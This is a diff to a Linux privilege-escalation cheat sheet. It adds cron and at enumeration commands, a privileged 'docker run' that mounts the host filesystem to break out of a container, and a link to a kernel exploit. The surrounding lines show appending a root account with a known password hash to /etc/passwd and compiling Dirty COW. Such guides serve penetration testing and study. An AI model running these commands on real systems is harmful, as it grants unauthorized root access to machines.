@@ -187,11 +187,19 @@ Check inside the file, to find other paths with write permissions.
 /etc/cron.weekly
 /etc/sudoers
 /etc/exports
-/etc/at.allow
-/etc/at.deny
 /etc/anacrontab
 /var/spool/cron
 /var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
 ```
 
 ## Systemd timers
@@ -514,6 +522,12 @@ $> docker run -it --rm -v $PWD:/mnt bash
 $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
 ```
 
+Almost similar but you will also see all processes running on the host and be connected to the same NICs.
+
+```powershell
+docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
+```
+
 Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell
 
 ```powershell
@@ -584,6 +598,7 @@ Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
 
 ### CVE-2010-3904 (RDS)
